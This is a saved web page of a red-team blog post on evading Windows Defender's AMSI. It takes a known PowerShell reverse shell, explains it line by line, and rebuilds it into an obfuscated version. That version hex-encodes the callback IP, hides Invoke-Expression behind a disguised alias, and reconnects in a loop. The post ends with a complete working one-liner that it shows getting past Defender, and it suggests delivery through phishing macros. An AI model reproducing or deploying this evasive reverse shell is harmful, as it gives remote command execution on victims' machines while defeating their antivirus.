+			<section id="search-4" class="widget-container widget_search">
+<form role="search" method="get" class="searchform" action="https://0xdarkvortex.dev/">
+	<label>
+		<span class="screen-reader-text">Search for:</span>
+		<input type="search" class="s" placeholder="Search" name="s">
+	</label>
+	<button type="submit" class="searchsubmit"><span class="screen-reader-text">Search</span><i class="icon-search"></i></button>
+</form>
+</section><section id="categories-9" class="widget-container widget_categories"><h3 class="widget-title"><span>View Blogs by Category</span></h3><form action="https://0xdarkvortex.dev" method="get"><label class="screen-reader-text" for="cat">View Blogs by Category</label><select name="cat" id="cat" class="postform">
+	<option value="-1" selected="selected">Select Category</option>
+	<option class="level-0" value="89">Blogs by Paranoid Ninja&nbsp;&nbsp;(17)</option>
+	<option class="level-0" value="91">Blogs by Winsaaf&nbsp;&nbsp;(4)</option>
+	<option class="level-0" value="69">Course Reviews&nbsp;&nbsp;(1)</option>
+	<option class="level-0" value="71">Hardware Hacking&nbsp;&nbsp;(2)</option>
+	<option class="level-0" value="66">Linux&nbsp;&nbsp;(2)</option>
+	<option class="level-0" value="67">Malware Development&nbsp;&nbsp;(6)</option>
+	<option class="level-0" value="70">Rant&nbsp;&nbsp;(1)</option>
+	<option class="level-0" value="68">Reverse Engineering&nbsp;&nbsp;(5)</option>
+	<option class="level-0" value="64">Shellcoding&nbsp;&nbsp;(3)</option>
+	<option class="level-0" value="65">Windows&nbsp;&nbsp;(15)</option>
+	<option class="level-0" value="92">Windows Active Directory&nbsp;&nbsp;(4)</option>
+</select>
+</form>
+<script type="text/javascript">
+/* <![CDATA[ */
+(function() {
+	var dropdown = document.getElementById( "cat" );
+	function onCatChange() {
+		if ( dropdown.options[ dropdown.selectedIndex ].value > 0 ) {
+			dropdown.parentNode.submit();
+		}
+	}
+	dropdown.onchange = onCatChange;
+})();
+/* ]]> */
+</script>
+
+			</section>		</aside><!--content-widget-->
+		
+			<article id="post-2799" class="post-2799 post type-post status-publish format-standard hentry category-blogs-by-paranoid-ninja category-malware-development category-windows" itemscope="" itemtype="http://schema.org/Article" itemprop="mainEntity">
+				<div class="schema-image">
+									</div>
+
+				<div class="article-inner">
+					<header>
+						<div class="entry-meta beforetitle-meta">
+													</div><!-- .entry-meta -->
+						
+						<div class="entry-meta aftertitle-meta">
+							<span class="author vcard" itemscope="" itemtype="http://schema.org/Person" itemprop="author"><img alt="" src="Red%20Team%20TTPs%20Part%201%20AMSI%20Evasion%20%E2%80%93%200xDarkVortex_files/8cbcc0bc2bbd045be1578b18e8babb74.jpg" srcset="https://secure.gravatar.com/avatar/8cbcc0bc2bbd045be1578b18e8babb74?s=192&amp;d=mm&amp;r=g 2x" class="avatar avatar-96 photo" loading="lazy" width="96" height="96"><em>Posted by </em><a class="url fn n" rel="author" href="https://0xdarkvortex.dev/index.php/author/paranoidninja/" title="View all posts by paranoidninja" itemprop="url">
+					<em itemprop="name">paranoidninja</em>
+				</a> <em>on</em></span>
+		<span class="onDate date">
+				<i class="icon-date icon-metas" title="Date"></i>
+				<time class="published" datetime="2019-07-17T04:34:32+05:30" itemprop="datePublished">
+					July 17, 2019				</time>
+				<time class="updated" datetime="2020-10-09T10:58:28+05:30" itemprop="dateModified">October 9, 2020</time>
+		</span>
+		<span class="bl_categ">
+					<i class="icon-category icon-metas" title="Categories"></i> <a href="https://0xdarkvortex.dev/index.php/category/blogs-by-paranoid-ninja/" rel="category tag">Blogs by Paranoid Ninja</a> <span class="sep">/</span> <a href="https://0xdarkvortex.dev/index.php/category/malware-development/" rel="category tag">Malware Development</a> <span class="sep">/</span> <a href="https://0xdarkvortex.dev/index.php/category/windows/" rel="category tag">Windows</a></span>						</div><!-- .entry-meta -->
+
+					</header>
+
+					
+					<div class="entry-content" itemprop="articleBody">
+						
+<p>It’s been a while since I wrote my last blog-post. I wrote this post 
+partially quite a while back, but then I joined as a Senior Red Team 
+Consultant at Mandiant/Fireeye and its been a bumpy ride for me since 
+I’ve been too busy with office projects as well as a personal project of
+ mine for Red team and Adversary Simulation which you might have already
+ noticed via my <a href="https://twitter.com/NinjaParanoid/status/1138164651496071168">Twitter posts</a>.
+ So, I finally took a break and decided to continue this post of writing
+ payloads for Red Teaming. This is a continuation of my <a href="https://0xdarkvortex.dev/index.php/category/malware-development/">previous posts here</a>. All my further posts on Evasion, Persistence, Phishing will be posted in this series. So, let’s get started.</p>
+
+
+
+<p>This post will be all about evading most of the AVs out there via 
+PowerShell obfuscation. This is not something new, but a lot of people 
+were asking me how to really hide, or how to obfuscate an existing 
+payload or a reverse shell of PowerShell which is already detectable. 
+So, I decided that I would take a known PowerShell reverse shell which 
+is categorized as malicious by Defender and Symantec Endpoint Protection
+ since these 2 are some of the common AVs which most of the 
+organizations depend on), and I will obfuscate them to make them 
+undetectable. Also take a note that this obfuscation just not only work 
+for payloads, but you can use the below technique to obfuscate existing 
+tools like PowerSploit, PowerView to evade AVs and EDRs. That’s the 
+beauty of PowerShell.</p>
+
+
+
+<h2>The Payload</h2>
+
+
+
+<p>I will be using the below payload for the simulation downloaded from <a href="https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcpOneLine.ps1">here</a>:</p>
+
+
+<pre class="theme:sublime-text width-set:true width:700 lang:ps decode:true  crayon-selected" title="PowerShell Payload">$client = New-Object System.Net.Sockets.TCPClient('192.168.56.1',8080);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '&gt; ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()</pre>
+<p></p>
+
+
+<p>Now, if you start a netcat listener on port 8080, and enter the above
+ code into PowerShell with Win Defender or any other AV enabled, it will
+ be flagged as malicious as you can see below.</p>
+
+
+
+<div class="wp-block-image"><figure class="aligncenter is-resized"><a href="https://0xdarkvortex.dev/wp-content/uploads/2019/07/powershell-1.png" target="_blank" rel="noreferrer noopener"><img src="Red%20Team%20TTPs%20Part%201%20AMSI%20Evasion%20%E2%80%93%200xDarkVortex_files/powershell-1.png" alt="" class="wp-image-2805" srcset="https://0xdarkvortex.dev/wp-content/uploads/2019/07/powershell-1.png 942w, https://0xdarkvortex.dev/wp-content/uploads/2019/07/powershell-1-300x71.png 300w, https://0xdarkvortex.dev/wp-content/uploads/2019/07/powershell-1-768x182.png 768w, https://0xdarkvortex.dev/wp-content/uploads/2019/07/powershell-1-382x90.png 382w" sizes="(max-width: 942px) 100vw, 942px" width="700"></a><figcaption>PowerShell payload detected as malicious</figcaption></figure></div>
+
+
+
+<p>Now, our task is to make sure this payload doesn’t get flagged. Let’s
+ first dissect the above payload brick by brick and understand the code.</p>
+
+
+
+<p>Create a TCP Socket over the required host/port.</p>
+
+
+
+<pre class="wp-block-code"><code class="">$client = New-Object System.Net.Sockets.TCPClient('192.168.56.1',8080)</code></pre>
+
+
+
+<p>Create a stream for input and output on the above socket.</p>
+
+
+
+<pre class="wp-block-code"><code class="">$stream = $client.GetStream()</code></pre>
+
+
+
+<p>The above stream will be used to convert each ASCII/UNICODE character into bytes which can be sent over the network.</p>
+
+
+
+<pre class="wp-block-code"><code class="">[byte[]]$bytes = 0..65535|%{0}</code></pre>
+
+
+
+<p>Create a loop to continuously read and write for every input received
+ or output sent over the network. While bytes received is not equal to 
+zero, continuously read through the socket for input from the server.</p>
+
+
+
+<pre class="wp-block-code"><code class="">while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){ ... }</code></pre>
+
+
+
+<p>Get data from client side.</p>
+
+
+
+<pre class="wp-block-code"><code class="">$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)</code></pre>
+
+
+
+<p><strong>iex</strong> is the PowerShell alias for Invoke-Expression. Here, <strong>iex</strong>
+ executes the code in the data variable, converts it to string whereas 
+error is redirected to null, and then stores it inside the <strong>$sendback</strong> variable.</p>
+
+
+
+<pre class="wp-block-code"><code class="">$sendback = (iex $data 2&gt;&amp;1 | Out-String )</code></pre>
+
+
+
+<p>Now the current PowerShell path is appended to the string created inside <strong>$sendback2</strong> variable.</p>
+
+
+
+<pre class="wp-block-code"><code class="">$sendback2  = $sendback + 'PS ' + (pwd).Path + '&gt; '</code></pre>
+
+
+
+<p>The above string in the variable is converted to socket readable bytes.</p>
+
+
+
+<pre class="wp-block-code"><code class="">$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)</code></pre>
+
+
+
+<p>The above bytes are written over the stream socket.</p>
+
+
+
+<pre class="wp-block-code"><code class="">$stream.Write($sendbyte,0,$sendbyte.Length)</code></pre>
+
+
+
+<p>All bytes are flushed to the screen.</p>
+
+
+
+<pre class="wp-block-code"><code class="">$stream.Flush()</code></pre>
+
+
+
+<p>Close the socket once the while loop is closed.</p>
+
+
+
+<pre class="wp-block-code"><code class="">$client.Close()</code></pre>
+
+
+
+<h2>The Evasion</h2>
+
+
+
+<p>Okay. So, this was easy. Now comes the fun part. Windows uses AMSI 
+(Anti-Malware Scan Interface) for detecting malicious payloads. Now as 
+for detecting the PowerShell part, AMSI uses string based detection. 
+Now, since the above payloads are pretty famous on the web, its pretty 
+easy to create a YARA rule for detecting the above payload. Most people 
+try to obfuscate the above code by converting it to base64, but that 
+won’t work. Reason being, AMSI can straight away detect malicious 
+strings out of the base64 or can easily decode base64 and detect the 
+strings used inside the PowerShell command.</p>
+
+
+
+<p>Now, the trick here is to obfuscate each of the above commands 
+separately instead of encoding them all together. The reason this works 
+for evasion is because, if we take apart the payload and type each of 
+them into the PowerShell terminal, it won’t be tagged as malicious since
+ each of them gets categorized as a different command and these commands
+ are legitimate commands of PowerShell. But, if we stitch them together,
+ then the script acts as a single payload which can be easily used for 
+detection using something like YARA or string based detection. So in 
+simple words, our tasks are the below steps:</p>
+
+
+
+<ol><li>Break the payload</li><li>Obfuscate each line of command</li><li>Stitch the payload</li><li>Encode the payload</li></ol>
+
+
+
+<p>We have already broken down the payload above. It’s now time to 
+obfuscate each of the commands. For the obfuscation part, we will be 
+using everything we can starting from the environment variables ending 
+up to the built-in PowerShell commands. Also, let’s just change the TCP 
+socket to a Custom HTTP connection, in case we need to use these 
+payloads inside Word Macros for Spear Phishing activities.</p>
+
+
+
+<p>First, let’s obfuscate our IP address to simple hex. My C2 Host IP is
+ be 192.168.56.1 which stands for 192 = c0, 168=a8, 56=38, 1=1</p>
+
+
+
+<div class="wp-block-image"><figure class="aligncenter is-resized"><a href="https://0xdarkvortex.dev/wp-content/uploads/2019/07/ip-hex.png" target="_blank" rel="noreferrer noopener"><img src="Red%20Team%20TTPs%20Part%201%20AMSI%20Evasion%20%E2%80%93%200xDarkVortex_files/ip-hex.png" alt="" class="wp-image-2855" srcset="https://0xdarkvortex.dev/wp-content/uploads/2019/07/ip-hex.png 887w, https://0xdarkvortex.dev/wp-content/uploads/2019/07/ip-hex-300x34.png 300w, https://0xdarkvortex.dev/wp-content/uploads/2019/07/ip-hex-768x87.png 768w, https://0xdarkvortex.dev/wp-content/uploads/2019/07/ip-hex-382x43.png 382w" sizes="(max-width: 887px) 100vw, 887px" width="700"></a><figcaption>IP to hex conversion in bash</figcaption></figure></div>
+
+
+
+<p>Now, we will decode this during run-time in PowerShell. So the code 
+to convert this to IP would be as follows. Here I am storing the hex of 
+IP in the <strong>$px</strong> variable, and then converting it to IP and storing it inside the <strong>$p</strong> variable.</p>
+
+
+
+<pre class="wp-block-code"><code class="">$px = "c0","a8","38","1"
+$p = ($px | ForEach { [convert]::ToInt32($_,16) }) -join '.'</code></pre>
+
+
+
+<p>Next, we will setup a simple GET request for our HTTP request. You 
+can add up things as you proceed, but we will be keeping it pretty 
+simple as for now. Make sure you don’t forget the \r\n with a backtick. 
+Else it won’t go as a HTTP request. Also, instead of using the shortcut 
+alias <strong>text.encoding</strong> for byte conversion, let’s just stick to the API from dot net library itself <strong>[System.Text.ASCIIEncoding]</strong> for converting the string to bytes. We will be storing the bytes inside the <strong>$b</strong> variable and the the API <strong>[System.Text.ASCIIEncoding]</strong> inside the $s variable. We will be using this later for byte conversion.</p>
+
+
+
+<pre class="wp-block-code"><code class="">$w = "GET /index.html HTTP/1.1`r`nHost: $p`r`nMozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0`r`nAccept: text/html`r`n`r`n"
+$s = [System.Text.ASCIIEncoding]
+[byte[]]$b = 0..65535|%{0}</code></pre>
+
+
+
+<p>Now comes the main task of evading the IEX i.e. Invoke-Expression 
+Command. If you have played with EDR’s before, it’s known that IEX 
+a.k.a. Invoke-Expression is always flagged as malicious by default since
+ it is used to execute commands. So, we will make sure that neither any 
+string nor any encoded version of IEX is present in our payload, but we 
+will still use this command. Remember that IEX itself is not malicious. 
+It’s as good as any other Microsoft Dot Net API. It’s the strings used 
+alongside the IEX commands that flags it as malware. Now, in order to do
+ this, let’s take a random string here:</p>
+
+
+
+<pre class="wp-block-code"><code class="">$x = "n-eiorvsxpk5"</code></pre>
+
+
+
+<p>Now the above code would seem gibberish. But, we will be using that to do a lot of obfuscation. <strong>$x</strong>
+ stores a simple variable with a random string. Now, this string can’t 
+be flagged as malicious since this can be any random string and there 
+cannot be any YARA rule to detect random strings. What we are going to 
+do is, use this string to craft our IEX command. This is how we are 
+going to do it:</p>
+
+
+
+<pre class="wp-block-code"><code class="">Set-alias $x ($x[$true-10] + ($x[[byte]("0x" + "FF") - 265]) + $x[[byte]("0x" + "9a") - 158])</code></pre>
+
+
+
+<p>Now let’s dissect the above code. We will split it into 4 parts:</p>
+
+
+
+<pre class="wp-block-code"><code class="">1. Set-alias $x
+2. $x[$true-10]
+3. ($x[[byte]("0x" + "FF") - 265])
+4. $x[[byte]("0x" + "9a") - 158])</code></pre>
+
+
+
+<p>Let’s discuss the 2,3 and 4th point first. <strong>$true</strong> is 1 in numeric. So, <strong>$true-10</strong> becomes <strong>-9</strong>. Since <strong>$x</strong> is a string, we can extract <strong>-9th</strong> character from the <strong>$x</strong> variable which comes to:</p>
+
+
+
+<p><strong>$x[-9] = i</strong></p>
+
+
+
+<p>Next, <strong>“0x” + “FF”</strong> means <strong>0xFF</strong> which is the type-casted to byte using <strong>[byte]</strong>. 0xFF stands for 255 in numeric. So, <strong>255-265 = -10</strong>, leading us to:</p>
+
+
+
+<p><strong>$x[-10] = e</strong></p>
+
+
+
+<p>Similarly, the 4th point will give us <strong>0x9a – 158</strong> which gives us <strong>-4</strong> i.e.:</p>
+
+
+
+<p><strong>$x[-4] = x</strong></p>
+
+
+
+<p>So, concatenating the above, we get <strong>iex</strong>. And using <strong>Set-Alias</strong> we are assigning the command <strong>IEX</strong> to <strong>$x</strong>, which means the alias for <strong>IEX</strong> a.k.a. <strong>Invoke-Expression</strong> becomes our random string which is “<strong>n-eiorvsxpk5</strong>“. So now we can execute any command with the <strong>n-eiorvsxpk5</strong> expression. The below screenshot should explain this better:</p>
+
+
+
+<div class="wp-block-image"><figure class="aligncenter is-resized"><a href="https://0xdarkvortex.dev/wp-content/uploads/2019/07/Annotation-2019-07-07-123719.png" target="_blank" rel="noreferrer noopener"><img src="Red%20Team%20TTPs%20Part%201%20AMSI%20Evasion%20%E2%80%93%200xDarkVortex_files/Annotation-2019-07-07-123719-1024x537.png" alt="" class="wp-image-2900" srcset="https://0xdarkvortex.dev/wp-content/uploads/2019/07/Annotation-2019-07-07-123719-1024x537.png 1024w, https://0xdarkvortex.dev/wp-content/uploads/2019/07/Annotation-2019-07-07-123719-300x157.png 300w, https://0xdarkvortex.dev/wp-content/uploads/2019/07/Annotation-2019-07-07-123719-768x403.png 768w, https://0xdarkvortex.dev/wp-content/uploads/2019/07/Annotation-2019-07-07-123719-382x201.png 382w, https://0xdarkvortex.dev/wp-content/uploads/2019/07/Annotation-2019-07-07-123719.png 1206w" sizes="(max-width: 1024px) 100vw, 1024px" width="700"></a><figcaption>IEX obfuscation</figcaption></figure></div>
+
+
+
+<p>Alternatively, if you don’t want to use the same styled encoding for 
+I, E and X, you can use a different pattern as well. For example, we can
+ obfuscate the extraction of X from IEX by doing the following:</p>
+
+
+
+<pre class="wp-block-code"><code class="">Set-alias $x ($x[$true-10] + ($x[[byte]('0x' + 'FF') - 265]) + $x[$false - [int]([Datetime]::Today).ToString().Split("/")[2].Split(" ")[0] + 2015])</code></pre>
+
+
+
+<p>Here also, after the calculation, we will get <strong>-4</strong> as the reminder and <strong>x[-4]</strong> will give return <strong>x</strong> as the extracted string.</p>
+
+
+
+<p>Now what you see above is a pretty simple obfuscation. The only limit
+ is your creative mind. Next, we go ahead and create a socket with our 
+previously decoded <strong>$p</strong> variable which contains the IP 
+and our port. I have not obfuscated the port for now, since by now you 
+should already know how to do it. Also, we will setup the input-output 
+stream for our socket in the <strong>$z</strong> variable:</p>
+
+
+
+<pre class="wp-block-code"><code class="">$y = New-Object System.Net.Sockets.TCPClient($p,80)
+$z = $y.GetStream()</code></pre>
+
+
+
+<p>Next, we convert our data we created above (Useragent string with GET request) to bytes and store it inside a variable <strong>$d</strong>
+ and write it out to the server using the output stream we created 
+above. Now similarly, we wait for any input from the server and upon 
+receiving any input, it executes the command using  <strong>n-eiorvsxpk5</strong> i.e. Invoke-Expression, convert it to bytes and send it back.</p>
+
+
+
+<pre class="wp-block-code"><code class="">$d = $s::UTF8.GetBytes($w)
+$z.Write($d, 0, $d.Length)
+$t = (n-eiorvsxpk5 whoami) + "$ "
+while(($l = $z.Read($b, 0, $b.Length)) -ne 0){
+    $v = (New-Object -TypeName $s).GetString($b,0, $l)
+    $t = (&amp;"whoami") + "$ "
+    $d = $s::UTF8.GetBytes((n-eiorvsxpk5 $v 2&gt;&amp;1 | Out-String )) + $s::UTF8.GetBytes($t)
+    $z.Write($d, 0, $d.Length)
+}
+$y.Close()</code></pre>
+
+
+
+<p>One more thing you can see above is I am appending the output of command <strong>whoami</strong>, storing it inside <strong>$t</strong>
+ variable and sending it with every data over the network. Also, we 
+close the socket in the end once we receive Zero bytes from the server. 
+And finally we will put this whole payload inside a while true loop 
+along with a sleep command, so that even if our connection breaks, it 
+will sleep an X number of seconds and then try to reconnect back to our 
+server. This is how the final code looks like:</p>
+
+
+
+<pre class="wp-block-code"><code class="">while ($true) {
+    $px = "c0","a8","38","1"
+    $p = ($px | ForEach { [convert]::ToInt32($_,16) }) -join '.'
+    $w = "GET /index.html HTTP/1.1`r`nHost: $p`r`nMozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0`r`nAccept: text/html`r`n`r`n"
+    $s = [System.Text.ASCIIEncoding]
+    [byte[]]$b = 0..65535|%{0}
+    $x = "n-eiorvsxpk5"
+    Set-alias $x ($x[$true-10] + ($x[[byte]("0x" + "FF") - 265]) + $x[[byte]("0x" + "9a") - 158])
+    $y = New-Object System.Net.Sockets.TCPClient($p,80)
+    $z = $y.GetStream()
+    $d = $s::UTF8.GetBytes($w)
+    $z.Write($d, 0, $d.Length)
+    $t = (n-eiorvsxpk5 whoami) + "$ "
+    while(($l = $z.Read($b, 0, $b.Length)) -ne 0){
+        $v = (New-Object -TypeName $s).GetString($b,0, $l)        
+        $d = $s::UTF8.GetBytes((n-eiorvsxpk5 $v 2&gt;&amp;1 | Out-String )) + $s::UTF8.GetBytes($t)
+        $z.Write($d, 0, $d.Length)
+    }
+    $y.Close()
+    Start-Sleep -Seconds 5
+}</code></pre>
+
+
+
+<p>Now some of you might be wondering why I haven’t obfuscated the 
+remaining part of the code and concentrated more on the IEX part. The 
+reason being when you strip down the whole code and execute them in 
+PowerShell one by one, you will realize that <strong>IEX</strong> is the
+ part which is flagged by AMSI, and not any other portion. But feel free
+ to obfuscate the remaining parts of the payload. Here is the one liner 
+for the above payload:</p>
+
+
+
+<pre class="wp-block-code"><code class="">while ($true) {$px = "c0","a8","38","1";$p = ($px | ForEach { [convert]::ToInt32($_,16) }) -join '.';$w = "GET /index.html HTTP/1.1`r`nHost: $p`r`nMozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0`r`nAccept: text/html`r`n`r`n";$s = [System.Text.ASCIIEncoding];[byte[]]$b = 0..65535|%{0};$x = "n-eiorvsxpk5";Set-alias $x ($x[$true-10] + ($x[[byte]("0x" + "FF") - 265]) + $x[[byte]("0x" + "9a") - 158]);$y = New-Object System.Net.Sockets.TCPClient($p,80);$z = $y.GetStream();$d = $s::UTF8.GetBytes($w);$z.Write($d, 0, $d.Length);$t = (n-eiorvsxpk5 whoami) + "$ ";while(($l = $z.Read($b, 0, $b.Length)) -ne 0){;$v = (New-Object -TypeName $s).GetString($b,0, $l);$d = $s::UTF8.GetBytes((n-eiorvsxpk5 $v 2&gt;&amp;1 | Out-String )) + $s::UTF8.GetBytes($t);$z.Write($d, 0, $d.Length);}$y.Close();Start-Sleep -Seconds 5}</code></pre>
+
+
+
+<p>And finally, we test it against the AMSI. As you can see below, the 
+Defender is updated to the latest version. It still blocks the default 
+payload, but when we use our custom one, it evades AMSI.</p>
+
+
+
+<div class="wp-block-image"><figure class="aligncenter is-resized"><a href="https://0xdarkvortex.dev/wp-content/uploads/2019/07/final.png" target="_blank" rel="noreferrer noopener"><img src="Red%20Team%20TTPs%20Part%201%20AMSI%20Evasion%20%E2%80%93%200xDarkVortex_files/final-1024x396.png" alt="" class="wp-image-2947" srcset="https://0xdarkvortex.dev/wp-content/uploads/2019/07/final-1024x396.png 1024w, https://0xdarkvortex.dev/wp-content/uploads/2019/07/final-300x116.png 300w, https://0xdarkvortex.dev/wp-content/uploads/2019/07/final-768x297.png 768w, https://0xdarkvortex.dev/wp-content/uploads/2019/07/final-382x148.png 382w, https://0xdarkvortex.dev/wp-content/uploads/2019/07/final.png 1920w" sizes="(max-width: 1024px) 100vw, 1024px" width="700"></a><figcaption>AMSI Evasion</figcaption></figure></div>
+											</div><!-- .entry-content -->
+
+					<footer class="entry-meta entry-utility">
+											</footer><!-- .entry-utility -->
+
+				</div><!-- .article-inner -->
+				
+	<span class="schema-publisher" itemprop="publisher" itemscope="" itemtype="https://schema.org/Organization">
+         <span itemprop="logo" itemscope="" itemtype="https://schema.org/ImageObject">
+           <meta itemprop="url" content="https://0xdarkvortex.dev/wp-content/uploads/2019/05/imageedit_3_8921354725.png">
+         </span>
+         <meta itemprop="name" content="0xDarkVortex">
+    </span>
+<link itemprop="mainEntityOfPage" href="https://0xdarkvortex.dev/index.php/red-team-ttps-part-1-amsi-evasion/">			</article><!-- #post-## -->
+
+										
+										<section id="comments">
+	
+	
+		<div id="respond" class="comment-respond">
+		<h3 id="reply-title" class="comment-reply-title">Leave a Reply <small><a rel="nofollow" id="cancel-comment-reply-link" href="https://0xdarkvortex.dev/index.php/2019/07/17/red-team-ttps-part-1-amsi-evasion/#respond" style="display:none;">Cancel reply</a></small></h3><p class="must-log-in">You must be <a href="https://0xdarkvortex.dev/wp-login.php?redirect_to=https%3A%2F%2F0xdarkvortex.dev%2Findex.php%2F2019%2F07%2F17%2Fred-team-ttps-part-1-amsi-evasion%2F">logged in</a> to post a comment.</p>	</div><!-- #respond -->
+	</section><!-- #comments -->
+
+		
+			</main><!-- #main -->
+
+	</div><!-- #container -->
+
+		
+		<aside id="colophon" role="complementary" itemscope="" itemtype="http://schema.org/WPSideBar">
+			<div id="colophon-inside" class="footer-two ">
+				
+			</div>
+		</aside><!-- #colophon -->
+
+	</div><!-- #main -->
+
+	<footer id="footer" class="cryout" role="contentinfo" itemscope="" itemtype="http://schema.org/WPFooter">
+				<div id="footer-inside">
+			<a id="toTop" class="toTop-show"><span class="screen-reader-text">Back to Top</span><i class="icon-back2top"></i> </a><nav id="sfooter" class="socials"><a target="_blank" href="https://twitter.com/ninjaparanoid" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-2214" title="Twitter"></a></nav><div id="footer-separator"></div><div id="site-copyright">©2020 Dark Vortex</div>		</div> <!-- #footer-inside -->
+	</footer>
+</div><!-- site-wrapper -->
+	<script type="text/javascript" id="mkaz-code-syntax-prism-js-js-extra">
+/* <![CDATA[ */
+var prism_settings = {"pluginUrl":"https:\/\/0xdarkvortex.dev\/wp-content\/plugins\/code-syntax-block\/"};
+/* ]]> */
+</script>
+<script type="text/javascript" src="Red%20Team%20TTPs%20Part%201%20AMSI%20Evasion%20%E2%80%93%200xDarkVortex_files/prism.js" id="mkaz-code-syntax-prism-js-js"></script>
+<script type="text/javascript" src="Red%20Team%20TTPs%20Part%201%20AMSI%20Evasion%20%E2%80%93%200xDarkVortex_files/wp-embed.js" id="wp-embed-js"></script>
+<script type="text/javascript" id="anima-frontend-js-extra">
+/* <![CDATA[ */
+var cryout_theme_settings = {"masonry":"1","rtl":"","magazine":"2","fitvids":"1","autoscroll":"1","articleanimation":"slideLeft","lpboxratios":[1.237,1.083],"is_mobile":""};
+/* ]]> */
+</script>
+<script type="text/javascript" defer="defer" src="Red%20Team%20TTPs%20Part%201%20AMSI%20Evasion%20%E2%80%93%200xDarkVortex_files/frontend.js" id="anima-frontend-js"></script>
+<script type="text/javascript" src="Red%20Team%20TTPs%20Part%201%20AMSI%20Evasion%20%E2%80%93%200xDarkVortex_files/imagesloaded.js" id="imagesloaded-js"></script>
+<script type="text/javascript" defer="defer" src="Red%20Team%20TTPs%20Part%201%20AMSI%20Evasion%20%E2%80%93%200xDarkVortex_files/masonry.js" id="masonry-js"></script>
+<script type="text/javascript" defer="defer" src="Red%20Team%20TTPs%20Part%201%20AMSI%20Evasion%20%E2%80%93%200xDarkVortex_files/jquery_002.js" id="jquery-masonry-js"></script>
+<script type="text/javascript" src="Red%20Team%20TTPs%20Part%201%20AMSI%20Evasion%20%E2%80%93%200xDarkVortex_files/comment-reply.js" id="comment-reply-js"></script>
+
+
+</body></html>
